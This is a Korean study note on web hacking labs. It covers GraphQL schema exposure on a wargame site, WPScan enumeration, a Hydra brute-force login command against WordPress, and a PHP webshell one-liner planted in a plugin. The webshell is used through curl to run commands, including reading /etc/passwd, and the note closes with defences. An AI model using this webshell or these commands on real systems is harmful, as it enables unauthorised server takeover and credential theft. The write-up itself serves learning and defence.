# 웹 해킹 학습 정리

> 웹 애플리케이션의 보안 취약점 진단 및 공격 기법 학습

---

## 📋 목차
1. [GraphQL 보안](#graphql-보안)
2. [WordPress 취약점 진단](#wordpress-취약점-진단)
3. [PHP 웹셸과 원격 코드 실행](#php-웹셸과-원격-코드-실행)
4. [실전 공격 시나리오](#실전-공격-시나리오)

---

## GraphQL 보안

### GraphQL이란?
**GraphQL**은 Facebook(현 Meta)에서 개발한 웹 API를 위한 쿼리 언어이자 그 쿼리를 실행하는 서버 사이드 런타임입니다.

기존의 REST API가 가진 단점들을 해결하기 위해 만들어졌으며, **"원하는 데이터만 정확히 골라서 가져오는 데이터 요청 방식"**으로 이해하면 됩니다.

### 왜 GraphQL을 쓰는가?

#### ✅ GraphQL의 장점
- **단일 엔드포인트**: REST API의 `/users`, `/posts`, `/comments` 같은 수많은 URL을 관리할 필요가 없음. 모든 요청이 하나의 엔드포인트(`/graphql`)로 통합됨
- **프론트엔드/백엔드 독립성**: 화면이 바뀔 때마다 백엔드 개발자에게 요청할 필요 없이, 프론트엔드에서 쿼리만 수정하면 됨
- **강력한 타입 시스템 (Schema)**: 서버의 데이터 구조가 미리 정의되어 있어서 에러를 사전에 방지하고, API 문서가 자동으로 생성됨

#### ❌ GraphQL의 단점
- **초기 학습 비용**: 개념과 서버 설정을 이해하는 데 시간이 걸림
- **캐싱의 복잡함**: REST API는 HTTP URL 자체를 캐싱하면 되지만, GraphQL은 URL이 하나이고 본문(Body) 내용이 계속 바뀌기 때문에 캐싱 구현이 복잡함
- **무거운 쿼리 위험**: 클라이언트가 마음대로 쿼리를 작성할 수 있으므로, 깊은 depth로 복잡한 쿼리를 날리면 서버에 과부하 발생 가능 (서버 측 방어 코드 필수)

### GraphQL 보안 취약점

#### ⚠️ 스키마 정보 노출
GraphQL은 강력한 타입 시스템을 가지고 있지만, **스키마가 노출되면 서버 전체 구조가 드러날 수 있습니다.**

**예제:**
```graphql
# 스키마 정보 조회 (노출되어선 안 됨)
query {
  schema {
    types {
      names
    }
  }
}

# 특정 필드 조회
query {
  view {
    no,
    subject,
    content
  }
}
```

**실제 공격 URL:**
```
http://webhacking.kr:10012/view.php?query={view{no,subject,content}}
http://webhacking.kr:10012/view.php?query={schema{types{names}}}
```

**왜 위험한가?**
- 전체 데이터베이스 구조를 파악할 수 있음
- 공격자가 원하는 데이터를 정확히 요청할 수 있음
- 관리자 정보, 숨겨진 필드 등이 노출될 수 있음

**방어 방법:**
- 프로덕션 환경에서 GraphiQL 비활성화
- 스키마 내부 구조를 최소한으로 노출
- 깊이 제한(depth limit) 및 쿼리 복잡도 제한 구현

---

## WordPress 취약점 진단

### 왜 WordPress를 노린가?
WordPress는 전 세계 웹사이트의 약 43%가 사용하는 가장 인기 있는 CMS입니다. 따라서:
- **광범위한 피해 가능성**: 한 번의 공격으로 수많은 사이트가 영향을 받을 수 있음
- **대량의 취약점**: 수많은 플러그인과 테마로 인해 보안 허점이 많음
- **낮은 보안 인식**: 초보자도 쉽게 사용할 수 있지만, 보안 설정에는 무심할 수 있음

### WPScan을 이용한 정보 수집

#### WPScan이란?
WordPress 전용 보안 스캐너로, WordPress 설치본의 취약점을 자동으로 진단합니다.

**설치 및 사용:**
```bash
sudo wpscan --url 대상사이트 -e p,u
```

**옵션 설명:**
- `-e p,u`: 플러그인(plugins)과 사용자(users) 계정을 열거(enumerate)하는 옵션
  - `p`: Plugins 발견
  - `u`: Users 발견

**발견 가능한 정보:**
- WordPress 버전
- 설치된 플러그인 목록
- 테마 정보
- 등록된 사용자 이름 (아이디)
- `readme.html` 같은 버전 정보 파일

**예제:**
```bash
sudo wpscan --url vulnwp -e p,u
# 결과: 사용자 'admin', 플러그인 'akismet' 발견
```

### Hydra를 이용한 브루트포스 공격

#### Hydra란?
온라인 암호 크래킹 도구로, 여러 프로토콜의 로그인을 자동으로 시도합니다.

**WordPress 로그인 브루트포스:**
```bash
sudo hydra vulnwp http-form-post \
  "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=%EB%A1%9C%EA%B7%B8%EC%9D%B8&redirect_to=http%3A%2F%2Fvulnwp%2Fwordpress%2Fwp-admin%2F&testcookie=1:비밀번호가 틀립니다." \
  -l admin \
  -P wordpass.txt
```

**파라미터 설명:**
- `log=^USER^`: 사용자명 변수
- `pwd=^PASS^`: 비밀번호 변수
- `^USER^`: Hydra가 사용자명 리스트에서 값을 대입
- `^PASS^`: Hydra가 비밀번호 리스트에서 값을 대입
- `-l admin`: admin 사용자만 대상
- `-P wordpass.txt`: 비밀번호 사전 파일

**공격 과정:**
1. WPScan으로 사용자명 'admin' 발견
2. 일반적인 비밀번호 리스트를 이용한 자동 시도
3. 올바른 비밀번호 발견 시 로그인

---

## PHP 웹셸과 원격 코드 실행

### 웹셸(Web Shell)이란?
웹셸은 **웹 서버를 통해 원격으로 시스템 명령어를 실행할 수 있는 악성 코드**입니다.

공격자가 이를 심어두면, 브라우저의 URL만으로 서버의 모든 권한을 얻고 원격 제어가 가능해집니다.

### PHP 웹셸 취약점 예제

#### 취약한 코드 분석
```php
@extract($_REQUEST);
if (isset($x) && isset($y)) @die($x($y));
```

**이 코드의 문제점:**

1. **`extract($_REQUEST)`**
   - GET/POST/COOKIE의 모든 파라미터를 변수로 변환
   - `?x=system&y=ls` 요청 시 `$x = 'system'`, `$y = 'ls'` 생성

2. **`$x($y)` 실행**
   - 변수를 함수처럼 호출하는 PHP의 동적 함수 호출
   - `system('ls')` 실행 → 서버의 파일 목록이 브라우저에 출력

3. **`@die()`**
   - 결과를 출력하고 프로그램 종료

#### 공격 시나리오

**1단계: 파일 업로드**
WordPress의 취약한 플러그인(예: akismet)에 웹셸 코드 삽입

**2단계: 파일 위치 파악**
```
http://vulnwp/wordpress/wp-content/plugins/akismet/akismet.php
```

**3단계: 명령어 실행**

기본 조회:
```bash
curl http://vulnwp/wordpress/wp-content/plugins/akismet/akismet.php
# 결과: "Hi there! I'm just a plugin, not much I can do when called directly."
```

리스트 출력:
```bash
curl http://vulnwp/wordpress/wp-content/plugins/akismet/akismet.php --data "x=passthru&y=ls"

# 결과:
# LICENSE.txt
# akismet.php
# class.akismet-admin.php
# index.php
# readme.txt
# views
# wrapper.php
```

시스템 정보 + 패스워드 파일 조회:
```bash
curl http://vulnwp/wordpress/wp-content/plugins/akismet/akismet.php \
  --data "x=passthru&y=uname -a;cat /etc/passwd"
```

### 웹셸의 종류

Linux에는 다양한 웹셀 도구들이 준비되어 있습니다:

```bash
sudo ls /usr/share/webshells/php
# findsocket
# php-reverse-shell.php          ← 리버스 쉘 (공격자에게 직접 연결)
# simple-backdoor.php             ← 단순 백도어
# php-backdoor.php                ← PHP 백도어
# qsd-php-backdoor.php            ← QSD 백도어
```

**각 웹셸의 특징:**
- **Reverse Shell**: 공격자의 PC에 백도어 접속 (가장 위험)
- **Simple Backdoor**: 기본적인 명령어 실행
- **그 외**: 특화된 기능 제공

### RCE (Remote Code Execution)의 영향

웹셸을 통한 RCE가 성공하면 공격자는:
- ✋ 서버의 **모든 권한** 획득
- 📄 **중요 정보** 열람 (패스워드, 설정파일 등)
- 🔄 **다른 시스템** 공격의 발판
- 💥 **서비스 마비** (데이터 삭제, 변조)
- 📡 **좀비 컴퓨터** 만들기 (DDoS 공격 등)

---

## 실전 공격 시나리오

### 전체 공격 흐름

```
1. 정보 수집 (WPScan)
   ↓
2. 사용자명 발견 (admin)
   ↓
3. 비밀번호 크래킹 (Hydra)
   ↓
4. 관리자 로그인
   ↓
5. 취약한 플러그인 발견
   ↓
6. 웹셸 업로드/삽입
   ↓
7. RCE 달성
   ↓
8. 시스템 완전 장악
```

### 방어 방법

#### 관리자 입장
1. **WordPress & 플러그인 최신 유지**: 정기적인 업데이트
2. **강력한 비밀번호 사용**: 최소 12자 이상, 특수문자 포함
3. **admin 계정명 변경**: 기본값('admin') 사용 금지
4. **로그인 시도 제한**: 브루트포스 방지 플러그인 설치
5. **파일 권한 관리**: 불필요한 쓰기 권한 제거
6. **WAF (Web Application Firewall) 사용**

#### 개발자 입장
1. **입력 검증**: 모든 사용자 입력 검증
2. **parameterized queries 사용**: SQL 인젝션 방지
3. **함수형 프로그래밍**: 동적 함수 호출(`$x($y)`) 금지
4. **파일 업로드 제한**: 파일 타입, 크기 검증
5. **에러 메시지 최소화**: 시스템 정보 노출 금지

---

## 📚 참고 자료

- [GraphQL 공식 문서](https://graphql.org/)
- [WordPress 보안 가이드](https://wordpress.org/support/article/hardening-wordpress/)
- [WPScan 사용법](https://wpscan.com/)
- [OWASP Top 10](https://owasp.org/Top10/)

---

## ⚠️ 법적 고지

이 문서의 내용은 **교육 및 인가된 보안 테스트 목적**으로만 사용해야 합니다.
- 자신의 시스템이나 **명시적 허가를 받은 시스템**에만 적용
- 무단 접근은 **불법**입니다.

---
